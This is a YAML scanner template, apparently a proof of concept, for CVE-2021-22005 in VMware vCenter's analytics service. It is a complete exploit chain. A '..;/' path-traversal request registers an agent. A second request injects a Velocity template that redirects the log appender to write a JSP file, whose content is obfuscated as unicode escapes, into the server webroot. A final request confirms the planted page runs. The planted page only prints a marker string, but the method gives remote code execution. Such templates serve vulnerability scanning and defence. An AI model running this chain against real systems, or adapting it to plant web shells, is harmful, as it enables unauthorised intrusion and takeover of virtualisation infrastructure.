id: yaml-poc-vmware-cloud_foundation-directory_traversal-CVE-2021-22005
info:
  name: Yaml Poc Vmware Cloud_Foundation Directory_Traversal Cve 2021 22005
  author: converted
  severity: critical
  description: 'Converted from xpoc: yaml-poc-vmware-cloud_foundation-directory_traversal-CVE-2021-22005'
  tags: vmware,traversal,cve
  classification:
    cve-id: CVE-2021-22005
  reference:
  - http://blog.nsfocus.net/vmware-vcenter-server/
  - http://packetstormsecurity.com/files/164439/VMware-vCenter-Server-Analytics-CEIP-Service-File-Upload.html
  - https://help.aliyun.com/noticelist/articleid/1060913613.html
  - https://nvd.nist.gov/vuln/detail/CVE-2021-22005
  - https://packetstormsecurity.com/files/164439/VMware-vCenter-Server-Analytics-CEIP-Service-File-Upload.html
http:
- method: POST
  path:
  - /analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?_c={{s1}}&_i={{s2}}
  body: '{"manifestSpec": {}, "objectType": "a2", "collectionTriggerDataNeeded": true,
    "deploymentDataNeeded": true, "resultNeeded": true, "signalCollectionCompleted":
    true, "localManifestPath": "a7", "localPayloadPath": "a8", "localObfuscationMapPath":
    "a9"}'
  headers:
    Content-Type: application/json
    X-Deployment-Secret: abc
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 201
- method: POST
  path:
  - /analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent?action=collect&_c={{s1}}&_i={{s2}}
  body: '{"contextData": "a3", "manifestContent": "<manifest recommendedPageSize=\"500\">\n       <request>\n          <query
    name=\"vir:VCenter\">\n             <constraint>\n                <targetType>ServiceInstance</targetType>\n             </constraint>\n             <propertySpec>\n                <propertyNames>content.about.instanceUuid</propertyNames>\n                <propertyNames>content.about.osType</propertyNames>\n                <propertyNames>content.about.build</propertyNames>\n                <propertyNames>content.about.version</propertyNames>\n             </propertySpec>\n          </query>\n       </request>\n       <cdfMapping>\n          <indepedentResultsMapping>\n             <resultSetMappings>\n                <entry>\n                   <key>vir:VCenter</key>\n                   <value>\n                      <value
    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"resultSetMapping\">\n                         <resourceItemToJsonLdMapping>\n                            <forType>ServiceInstance</forType>\n                         <mappingCode><![CDATA[    \n                            #set($appender
    = $GLOBAL-logger.logger.parent.getAppender(\"LOGFILE\"))##\n                            #set($orig_log
    = $appender.getFile())##\n                            #set($logger = $GLOBAL-logger.logger.parent)##     \n                            $appender.setFile(\"/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/{{f1}}.jsp\")##     \n                            $appender.activateOptions()##  \n                            $logger.warn(\"\\u003c\\u0025\\u0020\\u006f\\u0075\\u0074\\u002e\\u0070\\u0072\\u0069\\u006e\\u0074\\u0028\\u0022\\u0061\\u0073\\u0064\\u0066\\u0067\\u0068\\u0076\\u0066\\u0074\\u0079\\u0064\\u0075\\u0077\\u006a\\u0068\\u0064\\u006a\\u0075\\u0079\\u0074\\u0032\\u0031\\u0036\\u0037\\u0038\\u0065\\u0075\\u0033\\u0039\\u0068\\u0037\\u0064\\u0033\\u0032\\u0068\\u0065\\u0079\\u0075\\u0077\\u006a\\u0069\\u0071\\u0079\\u0074\\u0065\\u0072\\u0079\\u0037\\u0075\\u0033\\u0039\\u0032\\u0032\\u0074\\u0036\\u0067\\u0031\\u0037\\u0068\\u0065\\u0038\\u0064\\u0077\\u0068\\u0022\\u0029\\u003b\\u0020\\u0025\\u003e\")##   \n                            $appender.setFile($orig_log)##     \n                            $appender.activateOptions()##]]>\n                         </mappingCode>\n                         </resourceItemToJsonLdMapping>\n                      </value>\n                   </value>\n                </entry>\n             </resultSetMappings>\n          </indepedentResultsMapping>\n       </cdfMapping>\n       <requestSchedules>\n          <schedule
    interval=\"1h\">\n             <queries>\n                <query>vir:VCenter</query>\n             </queries>\n          </schedule>\n       </requestSchedules>\n    </manifest>",
    "objectId": "a2"}'
  headers:
    Content-Type: application/json
    X-Deployment-Secret: abc
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
- method: GET
  path:
  - /idm/..;/{{f1}}.jsp
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
